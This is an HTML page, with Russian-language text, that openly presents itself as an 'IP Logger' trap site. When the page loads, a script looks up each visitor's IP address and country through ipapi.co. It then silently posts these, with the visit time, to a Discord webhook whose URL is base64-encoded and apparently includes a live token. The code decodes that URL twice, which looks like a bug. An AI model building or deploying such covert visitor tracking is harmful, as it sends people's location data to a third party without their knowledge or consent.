<!DOCTYPE html>
<html>
<head>
    <title>IP Logger</title>
    <script>
        var webhook_url = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MzY0MTEzMjY3MzU5NzU2Mjo5bzFOcTE4eFpSS01pVDRxVXNqSXhfbDAyQ3BhVGR6VTJTZDVLMTVrZlJqY3hpZVhrLXVMZEp0amVpT1VoYW5DM3Iw"); // замените на свой Discord Webhook в зашифрованном виде
    </script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js" integrity="sha512-T5rJ7hDx8Wp33VDbvIZhKj7b9zQkZ5QxtgvvLwU5OoD5eBc85+oZHvIWq3qKjX1fHn0AfoSyuwYFuxgR0GKsBg==" crossorigin="anonymous"></script>
    <script>
        $.get("https://ipapi.co/json/", function(data) {
            var webhook_decoded = atob(webhook_url);
            var ip = data.ip;
            var country = data.country_name;
            var time = moment().format('MMMM Do YYYY, h:mm:ss a');
            var request = new XMLHttpRequest();
            request.open("POST", webhook_decoded);
            request.setRequestHeader('Content-type', 'application/json');
            var params = {
                username: "IP Logger",
                avatar_url: "https://i.imgur.com/WzAMxKl.png",
                embeds: [
                    {
                        title: "IP-адрес залогирован",
                        description: "Бебра",
                        color: 16711680,
                        fields: [
                            {
                                name: "IP",
                                value: ip,
                                inline: true
                            },
                            {
                                name: "Страна",
                                value: country,
                                inline: true
                            },
                            {
                                name: "Время посещения",
                                value: time
                            }
                        ],
                        timestamp: new Date(),
                        footer: {
                            text: "IP Logger"
                        }
                    }
                ]
            };
            request.send(JSON.stringify(params));
        });
    </script>
</head>
<body>
    <h1>Бебра</h1>
    <p>Это сайт-ловушка, который будет записывать IP-адреса, страны и время посещения людей, которые посещают его.</p>
</body>
</html>
